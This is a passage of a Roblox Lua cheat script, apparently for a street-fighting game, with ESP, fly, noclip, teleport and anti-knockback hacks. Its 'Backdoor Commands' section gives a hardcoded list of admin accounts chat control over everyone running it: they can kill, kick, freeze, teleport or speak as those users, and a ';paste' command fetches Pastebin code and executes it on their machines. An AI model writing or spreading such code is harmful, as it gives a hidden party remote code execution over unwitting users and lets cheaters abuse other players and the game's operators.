				c.Grip = CF(0.800000012, 0, 0, 0, -1, 0, 0, 0, 1, -1, 0, 0)
				c:WaitForChild("Punch1", 100).AnimationId = "rbxassetid://455657474"
				c:WaitForChild("Punch2", 100).AnimationId = "rbxassetid://455658585"
			elseif c.Name == "Pipe" then
				c.Grip = CF(0.800000012, 0, 0, 0, -1, 0, 0, 0, 1, -1, 0, 0)
				c:WaitForChild("Punch1", 100).AnimationId = "rbxassetid://503263392"
				c:WaitForChild("Punch2", 100).AnimationId = "rbxassetid://503264885"
				c:WaitForChild("Idle", 100).AnimationId = "rbxassetid://503259904"
			elseif c.Name == "Spray" then
				c.Grip = CF(0.200000003, -0.25, -0.200000003, 0.267457128, 0, 0.96356976, 0, 1, 0, -0.96356976, 0, 0.267457128)
			elseif c.Name == "BoomBox" and not tauntdebounce then
				c.Grip = CF(1, -1.25, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			end
		end
	end

	--//Gun Animations
	plr.Character.ChildAdded:Connect(function(c)
		GunAnimations(c)
	end)

	--//Backpack Stuff
	plr.Backpack.ChildAdded:Connect(function(c)
		BackpackStuff(c)
	end)

	--//Taunt
	uis.InputBegan:Connect(function(i, chatting)
		if chatting or taunting then return end
		taunting = true

		if i.KeyCode == Enum.KeyCode[Keys["pawelTaunt"]] then
			local taunt = TAUNTS[math.random(1, #TAUNTS)]

			while taunt == lasttaunt do
				taunt = TAUNTS[math.random(1, #TAUNTS)]
				wait()
			end

			ClearTools()
			if plr.Backpack:FindFirstChild"BoomBox" then
				local b = plr.Backpack:FindFirstChild"BoomBox"
				-- if b:FindFirstChild"Server" then
				tauntdebounce = true
				b.GripPos = Vector3.new(-6, -1.25, 0)
				b.Parent = plr.Character
				-- plr.Character.Torso:WaitForChild"Song".Looped = false
				b.Handle.SoundX.Looped = false
				PlayAudio(taunt[1], true)
				rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(taunt[2], "All")
				tauntdebounce = false
				-- repeat wait() until plr.Character.Torso:FindFirstChild"Song".PlaybackLoudness > 5
				repeat wait() until b.Handle.SoundX.PlaybackLoudness > 5
				-- repeat wait() until not plr.Character.Torso.Song.Playing
				repeat wait() until not b.Handle.SoundX.Playing
				if plr.Character:FindFirstChild"BoomBox" then
					-- plr.Character.Torso.Song.Looped = true
					b.Handle.SoundX.Looped = true
					b.RemoteEvent:FireServer"stop"
					wait(0.1)
					b.Parent = plr.Backpack
				end
				-- end
			end
			lasttaunt = taunt
		end
		taunting = false
	end)

	--//Animation Pack
	plr.Chatted:Connect(function(msg)
		if not mps:UserOwnsGamePassAsync(plr.UserId, 1523075) then
			local txt = msg:lower()
			if anims[txt] then
				if not txt:find"/e un" then
					local Anim = Instance.new"Animation"
					Anim.AnimationId = "rbxassetid://".. anims[txt]
					local track = plr.Character.Humanoid:LoadAnimation(Anim)
					track:Play()
				else
					for i, c in pairs(plr.Character.Humanoid:GetPlayingAnimationTracks()) do
						if c.Animation.AnimationId == "rbxassetid://".. anims[txt] then
							c:Stop()
						end
					end
				end
			end
		end
	end)

	--//Backdoor Commands
	local Admins = [[
	pawel630 | 120476167
	
	pawel63O | 1586447079
	
	daftpawel | 1599260675
	
	Skept_ic | 86628814
	
	Scottish_Korps | 1052485102
	
	Scottish_Viking | 24158945
	
	Scottish_WarIord | 1444303818
	
	Scottish_Berserkir | 1462635642
	
	Scottish_Burzim | 1462626899

	hanz | 1164329435
	
	nic | 137797918
	]]

	--//UserId Check
	function IdMatch(p, id)
		local name = plrs:GetNameFromUserIdAsync(id)

		if p.UserId == id and p.Name == name --[[and p.DisplayName == name ]]and p.Character.Name == name and p.CharacterAppearanceId == id --[[and p.Character:WaitForChild"Humanoid".DisplayName == name]] then
			return true
		end
		return false
	end

	function CheckAdmin(p)
		if string.find(Admins, p.UserId) and IdMatch(plr, plr.UserId) then
			return true
		end
		return false
	end

	function CheckName(p)
		if IdMatch(plr, overlord) or CheckAdmin(plr) and p.UserId ~= overlord then
			return true
		end
		return false
	end

	--//Client Bridge Commands
	function Commands(p)
		--p.Chatted:Connect(function(msg)
		rep:WaitForChild"DefaultChatSystemChatEvents":WaitForChild"OnMessageDoneFiltering".OnClientEvent:Connect(function(message)
			local player = plrs:FindFirstChild(message.FromSpeaker)
			local msg = message.Message or ""

			if p == player then
				local args = {}
				for arg in msg:gmatch("%S+") do
					args[#args + 1] = arg
				end
				if args[1] ~= nil then
					args[1] = args[1]:lower()
					if args[1] == ";kill" and args[2] ~= nil then
						local me = args[2]:lower()
						if CheckName(p) then return end
						if plr.Name:lower():sub(1, #me) == me or me == "all" or me == "others" then
							plr.Character:BreakJoints()
						end
					elseif args[1] == ";kick" and args[2] ~= nil then
						local me = args[2]:lower()
						if CheckName(p) then return end
						if plr.Name:lower():sub(1, #me) == me or me == "all" or me == "others" then
							plr:Kick("Sike get rekt by ".. p.Name)
						end
					elseif args[1] == ";bring" and args[2] ~= nil then
						local me = args[2]:lower()
						if CheckName(p) then return end
						if plr.Name:lower():sub(1, #me) == me or me == "all" or me == "others" then
							Teleport(p.Character.HumanoidRootPart)
						end
					elseif args[1] == ";freeze" and args[2] ~= nil then
						local me = args[2]:lower()
						if CheckName(p) then return end
						if plr.Name:lower():sub(1, #me) == me or me == "all" or me == "others" then
							root().Anchored = true
						end
					elseif args[1] == ";thaw" and args[2] ~= nil then
						local me = args[2]:lower()
						if CheckName(p) then return end
						if plr.Name:lower():sub(1, #me) == me or me == "all" or me == "others" then
							root().Anchored = false
						end
				--[[elseif args[1] == ";nani" and args[2] ~= nil then
					local me = args[2]:lower()
					if CheckName(p) then return end
					if plr.Name:lower():sub(1, #me) == me or me == "all" or me == "others" then
						root().Anchored = true
						wait(1)
						rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("NANI?!", "All")
						wait(5)
						plr.Character:BreakJoints()
					end]]
					elseif args[1] == ";chat" and args[2] ~= nil and args[3] ~= nil then
						local me = args[2]:lower()
						if CheckName(p) then return end
						local text = ""
						for i = 3, #args, 1 do
							local new = args[i]
							text = tostring(text.." "..new)
						end
						if plr.Name:lower():sub(1, #me) == me or me == "all" or me == "others" then
							rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
						end
					elseif args[1] == ";buyer" and args[2] ~= nil then
						local me = args[2]:lower()
						if CheckName(p) then return end
						if plr.Name:lower():sub(1, #me) == me or me == "all" or me == "others" then
							rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Buyer | true", "All")
						end
					elseif args[1] == ";disarm" and args[2] ~= nil then
						local me = args[2]:lower()
						if CheckName(p) then return end
						if plr.Name:lower():sub(1, #me) == me or me == "all" or me == "others" then
							ClearTools()
							for i, c in pairs(plr.Backpack:GetChildren()) do
								if CheckGuns(c) then
									c:Destroy()
								end
							end
						end
					elseif args[1] == ";play" and args[2] ~= nil and args[3] ~= nil then
						local me = args[2]:lower()
						if CheckName(p) then return end
						if plr.Name:lower():sub(1, #me) == me or me == "all" or me == "others" then
							ClearTools()
							PlayAudio(args[3]:match"%d+")
						end
					elseif args[1] == ";cmd" and args[2] ~= nil and args[3] ~= nil then
						local me = args[2]:lower()
						if CheckName(p) then return end
						local text = ""
						for i = 3, #args, 1 do
							local new = args[i]
							text = tostring(text.." "..new)
						end
						if plr.Name:lower():sub(1, #me) == me or me == "all" or me == "others" then
							TextBox2:CaptureFocus()
							TextBox2.Text = text
							TextBox2:ReleaseFocus()
						end
					elseif args[1] == ";paste" and args[2] ~= nil and args[3] ~= nil then
						local me = args[2]:lower()
						if CheckName(p) then return end
						if plr.Name:lower():sub(1, #me) == me or me == "all" or me == "others" then
							loadstring(game:HttpGet"https://pastebin.com/raw/".. args[3])()
						end
					end
				end
			end
		end)
	end

	--[[--//Local stuff
	plr.Chatted:Connect(function(msg)
		if msg:sub(1, 6):lower() == ";nani " then
			local TargetPlayer = msg:sub(7):lower()
			if TargetPlayer ~= nil then
				--//Target exists check
				for i, p in pairs(plrs:GetPlayers()) do
					if p.Name:sub(1, #TargetPlayer):lower() == TargetPlayer then
						--//Local player is admin check
						if CheckAdmin(plr) then
							--//Check if target is admin if pawel then do anyway
							if CheckAdmin(p) and plr.UserId ~= overlord then return end
							local temp = root().Position
							ClearTools()
							for i, b in pairs(GetTools("BoomBox")) do
								b.GripPos = Vector3.new(-12, -1.25, 0)
							end
							PlayAudio(992192914)
							root().CFrame = p.Character.HumanoidRootPart.CFrame * CF(0, 0, 3)
							root().Anchored = true
							rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Omae wa mu,", "All")
							wait(0.5)
							rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Shindeiru", "All")
							wait(7.5)
							root().CFrame = CF(temp)
							root().Anchored = false
							ClearTools()
						end
					end
				end
			end
		end
	end)]]

	--//Shotty Skins
	function ClearDecals(Shotty)
		if CurrentUnion ~= "All" then
			for i, c in pairs(Shotty:FindFirstChild(CurrentUnion):GetChildren()) do
				if c:IsA"Decal" then
					c:Destroy()
				end
			end
		else
			for i, c in pairs(Shotty:GetChildren()) do
				if c.Name:find"Union" then
					for j, d in pairs(c:GetChildren()) do
						if d:IsA"Decal" then
							d:Destroy()
						end
					end
				end
			end
		end
	end

	function NameUnions(Shotty)
		local count = 0
		for i, c in pairs(Shotty:GetChildren()) do
			if c:IsA"UnionOperation" then
				count = count + 1
				c.Name = "Union".. count
			end
		end
	end

	function CreateDecals(ID, d)
		local Decal = Instance.new("Decal", d)
		Decal.Texture = ID
		Decal.Face = "Front"
		local Decal1 = Instance.new("Decal", d)
		Decal1.Texture = ID
		Decal1.Face = "Back"
		local Decal2 = Instance.new("Decal", d)
		Decal2.Texture = ID
		Decal2.Face = "Right"
		local Decal3 = Instance.new("Decal", d)
		Decal3.Texture = ID
		Decal3.Face = "Left"
		local Decal4 = Instance.new("Decal", d)
		Decal4.Texture = ID
		Decal4.Face = "Top"
		local Decal5 = Instance.new("Decal", d)
		Decal5.Texture = ID
		Decal5.Face = "Bottom"
	end

	function ButtonStuff(c)
		c.MouseButton1Click:Connect(function()
			if c.Name:find"Union" or c.Name == "All" then
				CurrentUnion = c.Name
				for j, d in pairs(Frame2:GetChildren()) do
					if d.Name:find"Union" then
						d.BorderSizePixel = 0
					end
				end
				All.BorderSizePixel = 0
				c.BorderSizePixel = 4
			elseif c.Name == "Space" or c.Name == "Preview" then
				for j, d in pairs(GetTools("Shotty")) do
					NameUnions(d)
					ClearDecals(d)
					if CurrentUnion ~= "All" then
						if c.Name == "Space" then
							CreateDecals("http://www.roblox.com/asset/?id=1172930814", d:FindFirstChild(CurrentUnion))
						else
							CreateDecals(c.Image, d:FindFirstChild(CurrentUnion))
						end
					else
						if c.Name == "Space" then
							for k, e in pairs(d:GetChildren()) do
								if e.Name:find"Union" then
									CreateDecals("http://www.roblox.com/asset/?id=1172930814", e)
								end
							end
						else
							for k, e in pairs(d:GetChildren()) do
								if e.Name:find"Union" then
									CreateDecals(c.Image, e)
								end
							end
						end
					end
				end
			elseif c.Name == "Apply" then
				for j, d in pairs(GetTools("Shotty")) do
					NameUnions(d)
					if CurrentUnion ~= "All" then
						d:FindFirstChild(CurrentUnion).Material = Material.Text
					else
						for k, e in pairs(d:GetChildren()) do
							if e.Name:find"Union" then
								e.Material = Material.Text
							end
						end
					end
					return
				end
			elseif c.Name == "Neon" or c.Name == "Corroded" or c.Name == "Glass" or c.Name == "Slate" or c.Name == "Granite" then
				for j = 1, #Materials do
					if c.Name:lower() == Materials[j][1]:lower() then
						for k, d in pairs(GetTools("Shotty")) do
							NameUnions(d)
							if CurrentUnion ~= "All" then
								d:FindFirstChild(CurrentUnion).Material = Materials[j][2]
							else
								for l, e in pairs(d:GetChildren()) do
									if e.Name:find"Union" then
										e.Material = Materials[j][2]
									end
								end
							end
							return
						end
					end
				end
			else
				if CurrentUnion ~= nil then
					for j = 1, #Colors do
						if c.Name:lower() == Colors[j][1]:lower() then
							for k, d in pairs(GetTools("Shotty")) do
								NameUnions(d)
								ClearDecals(d)
								if CurrentUnion ~= "All" then
									d:FindFirstChild(CurrentUnion).UsePartColor = true
									d:FindFirstChild(CurrentUnion).BrickColor = BrickColor.new(Colors[j][2])
								else
									for l, e in pairs(d:GetChildren()) do
										if e.Name:find"Union" then
											e.UsePartColor = true
											e.BrickColor = BrickColor.new(Colors[j][2])
										end
									end
								end
								return
							end
						end
					end
				end
			end
		end)
	end

	for i, c in pairs(Frame2:GetChildren()) do
		if not c:IsA"TextBox" and not c:IsA"Frame" then
			ButtonStuff(c)
		end
	end

	ButtonStuff(All)

	ButtonStuff(Preview)

	ButtonStuff(Apply)

	Custom.FocusLost:Connect(function()
		Preview.Image = "http://www.roblox.com/asset/?id=".. Custom.Text:match"%d+"
	end)

	--//Bar Hide
	local bars = {}

	function fade()
		if bars[1][1].Transparency ~= 1 then
			for i = 1, #bars do
				coroutine.resume(coroutine.create(function()
					if bars[i][1].Transparency == 2 then
						bars[i][1].Transparency = 1
					end
					if bars[i][1].Bar.Transparency == 2 then
						bars[i][1].Bar.Transparency = 1
					end
					for j = 1, 10 do
						bars[i][1].Transparency = bars[i][1].Transparency + 0.1
						bars[i][1].Bar.Transparency = bars[i][1].Bar.Transparency + 0.1
						wait()
					end
					if bars[i][1].Transparency == 2 then
						bars[i][1].Transparency = 1
					end
					if bars[i][1].Bar.Transparency == 2 then
						bars[i][1].Bar.Transparency = 1
					end
				end))
			end
		end
	end

	function appear()
		if bars[1][1].Transparency ~= 0 then
			for i = 1, #bars do
				coroutine.resume(coroutine.create(function()
					if bars[i][1].Transparency == -0 then
						bars[i][1].Transparency = 0
					end
					if bars[i][1].Bar.Transparency == -0 then
						bars[i][1].Bar.Transparency = 0
					end
					for j = 1, 10 do
						bars[i][1].Transparency = bars[i][1].Transparency - 0.1
						bars[i][1].Bar.Transparency = bars[i][1].Bar.Transparency - 0.1
						wait()
					end
					if bars[i][1].Transparency == -0 then
						bars[i][1].Transparency = 0
					end
					if bars[i][1].Bar.Transparency == -0 then
						bars[i][1].Bar.Transparency = 0
					end
				end))
			end
		end
	end

	function BarHide()
		local unchanged = false

		for i, c in pairs(plr.PlayerGui.HUD:GetDescendants()) do
			if c.Name == "Bar" then
				table.insert(bars, {c.Parent, c.Size})
			end
		end
		if ONbarhide then
			fade()
		end
		for i = 1, #bars do
			bars[i][1].Bar:GetPropertyChangedSignal"Size":Connect(function()
				if bars[i][1].Bar.Size.X.Scale * bars[i][1].Bar.Size.Y.Scale < bars[i][2].X.Scale * bars[i][2].Y.Scale then
					bars[i][2] = bars[i][1].Bar.Size
					if unchanged or not ONbarhide then return end
					unchanged = true
					appear()
					wait(2)
					unchanged = false
					if not unchanged and ONbarhide then
						fade()
					end
				else
					bars[i][2] = bars[i][1].Bar.Size
				end
			end)
		end
	end
	BarHide()

	--//No Stop
	--[[function NoStop(char)
		char:FindFirstChildOfClass"Humanoid":GetPropertyChangedSignal"WalkSpeed":Connect(function()
			if char:FindFirstChildOfClass"Humanoid".WalkSpeed == 0 and ONnostop and not ONlegit then
				char:FindFirstChildOfClass"Humanoid".WalkSpeed = 16
			end
		end)
	end
	NoStop(plr.Character)]]

	--//Settings
	local success, err = pcall(function()
		readfile("Pawels Settings.txt")
	end)
	if success then
		loadstring(readfile("Pawels Settings.txt"))()
	elseif err then
		writefile("Pawels Settings.txt", Settings)
	end

	--//Inventory Sorting
	function GetOrder()
		for i = 1, #order do
			if order[i] ~= "Tool" then
				return true
			end
		end
		return false
	end

	function Sort()
		local amount = 0

		if GetOrder() then
			for i, c in pairs(plr.Backpack:GetChildren()) do
				if c:IsA"Tool" then
					if c.Name == "BoomBox" then
						if plr.Backpack:FindFirstChild"ServerTraits" then
							c.Parent = plr.Backpack.ServerTraits
						else
							c.Parent = plr.Backpack.Input
						end
					else
						c.Parent = plr
					end
				end
			end
			for i, c in pairs(plr.Character:GetChildren()) do
				if c:IsA"Tool" then
					if c.Name == "BoomBox" then
						if plr.Backpack:FindFirstChild"ServerTraits" then
							c.Parent = plr.Backpack.ServerTraits
						else
							c.Parent = plr.Backpack.Input
						end
					else
						c.Parent = plr
					end
				end
			end
			for i = 1, #order do
				for j, c in pairs(plr:GetDescendants()) do
					if c.Name:lower() == order[i]:lower() then
						if not plr.Backpack:FindFirstChild(c.Name) then
							c.Parent = plr.Backpack
							amount = amount + 1
						end
					end
				end
			end
			for i = 1, (10 - amount) do
				local t = Instance.new("Tool", plr.Backpack)
				t.Name = "TemporaryTool"
			end
			for i, c in pairs(plr:GetChildren()) do
				if c:IsA"Tool" then
					c.Parent = plr.Backpack
				end
			end
			if plr.Backpack:FindFirstChild"ServerTraits" then
				for i, c in pairs(plr.Backpack.ServerTraits:GetChildren()) do
					if c:IsA"Tool" then
						c.Parent = plr.Backpack
					end
				end
			else
				for i, c in pairs(plr.Backpack.Input:GetChildren()) do
					if c:IsA"Tool" then
						c.Parent = plr.Backpack
					end
				end
			end
			for i, c in pairs(plr.Backpack:GetChildren()) do
				if c:IsA"Tool" and c.Name == "TemporaryTool" then
					c:Destroy()
				end
			end
		end
	end
	Sort()

	--//Car Seats
	--[[if game.PlaceId == 455366377 then
		if ONseats then
			for i, d in pairs(gameDescendants) do
				if d:IsA"VehicleSeat" then
					table.insert(carseats, {d, d.Parent})
					d.Parent = rep
				end
			end
			
			workspace.Cars.ChildAdded:Connect(function(c)
				for i, d in pairs(gameDescendants) do
					if d:IsA"VehicleSeat" then
						table.insert(carseats, {d, d.Parent})
						d.Parent = rep
					end
				end
			end)
		end
	end]]

	--//Day Toggle
	function toggleday(Type)
		if daycon == nil then
			if Type == "night" then
				FogS = 0
				FogE = 1200
				light.FogColor  = Color3.new(0, 0, 0)
			elseif Type == "day" then
				FogS = 1000
				FogE = 5000
				light.FogColor = Color3.new(0.74902, 0.74902, 0.74902)
			end
			daycon = light.Changed:Connect(function()
				light.TimeOfDay = Time
				light.FogEnd = FogE
				light.FogStart = FogS
			end)
		end
	end

	--//Hitmarker
	function mark(char)
		char.DescendantAdded:Connect(function(c)
			if c:IsA"ObjectValue" and c.Name == "creator" and c.Value == plr.Character and ONhitmarker then
				local s = Instance.new("Sound", plr.PlayerGui)
				s.SoundId = "rbxassetid://5599621759"
				s.Volume = 1.5
				s:Play()
				repeat wait() until not s.Playing
				s:Destroy()
			end
		end)
	end

	--//Kos List / Esp
	function esp(p, mode, kind, txt)
		repeat wait() until p.Character ~= nil and p.Character:FindFirstChild"Head" ~= nil
		local alreadyEspd = true

		--//Check and create esp
		if kind == "esp" and not p.Character.Head:FindFirstChild"EspBbg" then
			CreateEsp(p.Character.Head, p.Name)
			alreadyEspd = false
		elseif kind ~= "esp" and not p.Character.Head:FindFirstChild"KosEspBbg" and not p.Character.Head:FindFirstChild"BuyerEspBbg" then
			CreateEsp(p.Character.Head, txt)
			alreadyEspd = false
		end

		--//Create connections ondied, rejoined
		if not alreadyEspd then
			local con = p.CharacterAdded:Connect(function(char)
				repeat heart:wait() until char:FindFirstChild"Head"
				if kind == "esp" and not p.Character.Head:FindFirstChild"EspBbg" then
					CreateEsp(p.Character.Head, p.Name)
				elseif kind ~= "esp" and not p.Character.Head:FindFirstChild"KosEspBbg" and not p.Character.Head:FindFirstChild"BuyerEspBbg" then
					CreateEsp(p.Character.Head, txt)
				end
			end)

			if kind == "esp" and mode == "plr" then
				table.insert(connections2, {p.Name:lower(), con})
			elseif kind == "esp" and mode == "all" then
				table.insert(connections2, {"Normal", con})
			elseif kind == "kos" and mode == "plr" then
				table.insert(connections3, {p.Name:lower(), con})
			elseif (kind == "buyer" or kind == "admin" or kind == "owner" or kind == "co owner") and mode == "plr" then
				table.insert(connections4, {p.Name:lower(), con})
			end
		end
	end

	function unesp(p, mode, kind)
		local bbgtype
		local contype
		if kind == "esp" then
			bbgtype = "EspBbg"
			contype = 2
		elseif kind == "kos" then
			bbgtype = "KosEspBbg"
			contype = 3
		elseif kind == "buyer" then
			bbgtype = "BuyerEspBbg"
			contype = 4
		end

		for i, c in pairs(p.Character:WaitForChild"Head":GetChildren()) do
			if c.Name == bbgtype then
				c:Destroy()
			end
		end
		if mode == "plr" and kind == "esp" then
			for j = 1, #connections2 do
				if connections2[j][1] == p.Name:lower() then
					connections2[j][2]:Disconnect()
				end
			end
		elseif mode == "all" and kind == "esp" then
			for j = 1, #connections2 do
				connections2[j][2]:Disconnect()
			end
		elseif mode == "plr" and kind == "kos" then
			for j = 1, #connections3 do
				if connections3[j][1] == p.Name:lower() then
					connections3[j][2]:Disconnect()
				end
			end
		elseif mode == "plr" and kind == "buyer" then
			for j = 1, #connections4 do
				if connections4[j][1] == p.Name:lower() then
					connections4[j][2]:Disconnect()
				end
			end
		end
	end	

	function espcheck(p, kind)
		if p == plr then return end
		local success, err = pcall(function()
			if string.find(koslist, p.UserId) and ONkosesp and kind ~= "buyer" then
				esp(p, "plr", "kos", "KILL")
			elseif p.UserId == overlord or p.UserId == 1013027452 or p.UserId == 1599260675 then
				esp(p, "plr", "owner", "Owner")
			elseif p.UserId == 24158945 then
				esp(p, "plr", "co owner", "Co Owner")
			elseif string.find(Admins, p.UserId) and ONbuyeresp then
				esp(p, "plr", "admin", "Admin")
			elseif whitelist ~= nil and (string.find(whitelist, "| ".. p.UserId) or p:GetRoleInGroup(5993069) == "Swag Buyer") and ONbuyeresp then
				esp(p, "plr", "buyer", "Buyer")
			end
		end)
	end

	--//PlayerAdded
	plrs.PlayerAdded:Connect(function(p)
		for j = 1, #connections2 do
			if connections2[j][1] == p.Name:lower() then
				table.remove(connections2, j)
				esp(p, "plr", "esp")
			end
		end

		--//Backdoor
		if CheckAdmin(p) then
			Commands(p)
		end

		--//Hitmarker
		if game.PlaceId == 4669040 then
			p.CharacterAdded:Connect(function(char)
				mark(char)
			end)
		end

		--//Esp
		if ONkosesp or ONbuyeresp then
			espcheck(p)
		end
	end)

	--//Execute Esp, backdoor and hitmarker
	coroutine.resume(coroutine.create(function()
		for i, p in pairs(plrs:GetPlayers()) do
			--//Hitmarker
			if p and p.Character and game.PlaceId == 4669040 then
				mark(p.Character)
				p.CharacterAdded:Connect(function(char)
					mark(char)
				end)
			end

			--//Backdoor
			if CheckAdmin(p) then
				Commands(p)
			end

			--//Esp
			espcheck(p)
		end
	end))

	--//Anti Void Fall
	for i = 1, 9 do
		local p = Instance.new("Part", workspace)
		if i == 1 then
			p.CFrame = CF(0, -490, 0)
		elseif i == 2 then
			p.CFrame = CF(2048, -490, 0)
		elseif i == 3 then
			p.CFrame = CF(0, -490, 2048)
		elseif i == 4 then
			p.CFrame = CF(-2048, -490, 0)
		elseif i == 5 then
			p.CFrame = CF(0, -490, -2048)
		elseif i == 6 then
			p.CFrame = CF(2048, -490, 2048)
		elseif i == 7 then
			p.CFrame = CF(-2048, -490, -2048)
		elseif i == 8 then
			p.CFrame = CF(2048, -490, -2048)
		elseif i == 9 then
			p.CFrame = CF(-2048, -490, 2048)
		end
		p.Anchored = true
		p.Size = Vector3.new(2048, 21, 2048)
		p.Transparency = 1
	end

	--//Auto Reset
	function AutoReset()
		plr.Character:WaitForChild"Torso".ChildAdded:Connect(function(c)
			if c.Name == "Bone" and ONautoreset then
				plr.Character:WaitForChild"Torso":Destroy()
			end
		end)
	end
	AutoReset()

	--//Command List Gui
	function toggleCmd()
		Main.Visible = not Main.Visible
	end

	Close.MouseButton1Click:Connect(function()
		toggleCmd()
	end)

	--//BFG Toggle
	function toggleBFG(val)
		ONbfg = false
		ONdualbfg = false
		ONknifeaura = false
		ONsuicidegun = false
		ONturrets = false
		ONmecha = false
		ONhorse = false
		ONhalo = false
		ONbayonet = false
	end

	--//Night Vision
	function CreateNV(val)
		if val then
			local NV = Instance.new("ColorCorrectionEffect", workspace.CurrentCamera)
			NV.Brightness = 0.2
			NV.Contrast = 0
			NV.Saturation = 0
			NV.TintColor = Color3.fromRGB(0, 157, 49)
			NV.Enabled = true
			NV.Name = "RegularVision"
		end

		local PL = Instance.new"PointLight"	
		PL.Brightness = 10
		PL.Color = Color3.fromRGB(255, 255, 255)
		PL.Range = 60
		PL.Shadows = false
		PL.Parent = plr.Character:WaitForChild"Torso"

		local On = Instance.new("Sound", plr.PlayerGui)
		On.Volume = 0.5
		On.SoundId = "rbxassetid://258186149"
		On.Playing = true
		repeat wait() until not On.Playing
		On:Destroy()
	end

	--//Teleport Function
	function Teleport(b, val)
		if not root() then return end

		--//Check which teleport mode
		if not ONteleport then
			if val then
				root().CFrame = CF(b)
			else
				root().CFrame = CF(b.Position)
			end
		elseif not teleporting then
			teleporting = true
			local speed = 5
			local IsON = false

			if not ONfly then
				Fly()
			end
			if not ONnoclip then
				Noclip()
			else
				IsON = true
			end
			if val then
				repeat
					if (root().Position - b).magnitude <= speed + 1 then
						root().CFrame = CF(root().Position, b) * CF(0, 0, -1)
					else
						root().CFrame = CF(root().Position, b) * CF(0, 0, -speed)
					end
					heart:wait()
				until not root() or (root().Position - b).magnitude <= 1.5
			else
				repeat
					if b and (root().Position - b.Position).magnitude <= speed + 1 then
						root().CFrame = CF(root().Position, b.Position) * CF(0, 0, -1)
					elseif b then
						root().CFrame = CF(root().Position, b.Position) * CF(0, 0, -speed)
					end
					heart:wait()
				until not root() or (root().Position - b.Position).magnitude <= 1.5
			end
			if not IsON then
				Noclip()
			end
			if ONfly then
				ONfly = false
			end
			teleporting = false
		end
	end

	--//Walk while knocked
	local function walk()
		plr.Character.Humanoid.StateChanged:Connect(function()
			if plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.PlatformStanding and ONwalk and not ONlegit then
				plr.Character.Humanoid:ChangeState(10)
			end
		end)
	end
	walk()

	--//Anti Knock
	local statedebounce = false
	local function antiKnock()
		plr.Character.Humanoid.StateChanged:Connect(function(State)
			if ONfly then
				plr.Character.Humanoid.PlatformStand = false
				plr.Character.Humanoid:ChangeState(8)
				if not statedebounce then
					statedebounce = true
					plr.Character.Humanoid:ChangeState(3)
					wait(0.2)
					statedebounce = false
				end
			elseif State == Enum.HumanoidStateType.FallingDown or State == Enum.HumanoidStateType.PlatformStanding and not ONlegit then
				wait(0.1)
				plr.Character.Humanoid.PlatformStand = false
				plr.Character.Humanoid.Sit = false
				plr.Character.Humanoid:ChangeState(2)
				plr.Character.Humanoid:ChangeState(10)
			end
		end)
	end
	antiKnock()

	--//Stomp
	function Stomp(tool)
		if plr.Backpack:FindFirstChild"ServerTraits" then
			plr.Backpack.ServerTraits.Finish:FireServer(tool)
		else
			plr.Backpack.Input:FireServer("e")
		end
	end

	function stompspam(tool)
		stompvalue = true
		coroutine.resume(coroutine.create(function()
			while stompvalue do
				Stomp(tool)
				wait()
			end
		end))
		wait(1)
		stompvalue = false
	end

	--//Rainbow Bullets
	function rainbowbullets(hum)
		rainbowbulletscon = hum.ChildAdded:Connect(function(c)
			if c.Name == "Bullet" then
				wait()
				c.Parent = workspace
				c.BrickColor = BrickColor.random()
				c.Material = Enum.Material.Neon
			end
		end)
	end
	if ONrainbowbullets then
		rainbowbullets(plr.Character:FindFirstChildOfClass"Humanoid")
	end
	
	--//Rainbow Trails
	function rainbowtrails(hum)
		rainbowtrailscon = hum.ChildAdded:Connect(function(c)
			if c.Name == "Bullet" then
				wait()
				c.Trail.Color = ColorSequence.new(BrickColor.new(rColors[colorNum]).Color)
				c.Trail.Transparency = NumberSequence.new(0)
				c.Trail.LightEmission = 0
				if colorNum < #rColors then
					colorNum += 1
				else
					colorNum = 1
				end
			end
		end)
	end
	if ONrainbowtrails then
		rainbowtrails(plr.Character:FindFirstChildOfClass"Humanoid")
	end

	--//Shot Count
	function shotcount()
		local HUD = plr.PlayerGui:WaitForChild"HUD"

		if not HUD:FindFirstChild"Shots" then
			Shots = HUD:FindFirstChild"Ammo":Clone()
			Shots.Parent = HUD
			Shots.Name = "Shots"
			Shots.Text = ""
			Shots.Position = HUD:FindFirstChild"Ammo".Position + UDim2.new(0, 0, 0.03, 0)
		end

		HUD:WaitForChild"Ammo":GetPropertyChangedSignal"Text":Connect(function()
			if HUD:FindFirstChild"Ammo".Text ~= "" and CheckGuns(plr.Character:FindFirstChildOfClass"Tool") then
				Shots.Text = plr.Character:FindFirstChildOfClass"Tool".Ammo.Value.. " Shots"
			else
				Shots.Text = ""
			end
		end)
	end
	shotcount()

	--//Femboy Hooters
	if workspace:FindFirstChild"ChickenResturant" then
		for i, c in pairs(workspace.ChickenResturant:GetChildren()) do
			if c:IsA"BasePart" and c:FindFirstChildOfClass"Decal" and c.Decal.Texture == "rbxassetid://533215702" then
				c.Decal.Texture = "rbxassetid://5203286820"
			end
		end
	end

	--//Descendant Functions
	gameDescendants = workspace:GetDescendants()

	for i = 1, #gameDescendants do
		local d = gameDescendants[i]

		--//Seats
		if d:IsA"Seat" then
			d.Parent = rep
			--//Get Doors
		elseif d:IsA"RemoteEvent" and d.Parent.Parent.Parent:IsA"Model" and d.Parent.Parent.Parent.Name == "Door" then
			table.insert(Doors, d.Parent.Parent.Parent)
			--//Transparent Trees
		elseif d.Name == "Tree" then
			local treeChildren = d:GetChildren()
			for j = 1, #treeChildren do
				local c = treeChildren[j]
				if c:IsA"Part" and c.Material == Enum.Material.Grass then
					c.Transparency = 0.7
				end
			end
			--//Item givers
		elseif d.Name:find"| %$" then
			table.insert(items, d)
			--//Prison Teleporter
		elseif d.Name == "TPer" then
			d.CanCollide = false
		end
	end

	--//Prevent Stuff From Breaking
	plr.CharacterAdded:Connect(function(char)
		local RADIOTYPE = Radiotype(false)

		--//Respawn
		coroutine.resume(coroutine.create(function()
			if ONrespawn then
				wait(0.2)
				if SpawnPos ~= 0 then
					Teleport(SpawnPos, true)
					heart:wait()
				end
			end
		end))

		--//BFG bypass
		if ONbypass then
			char:WaitForChild"Right Leg":Destroy()
		end

		--//Died Event
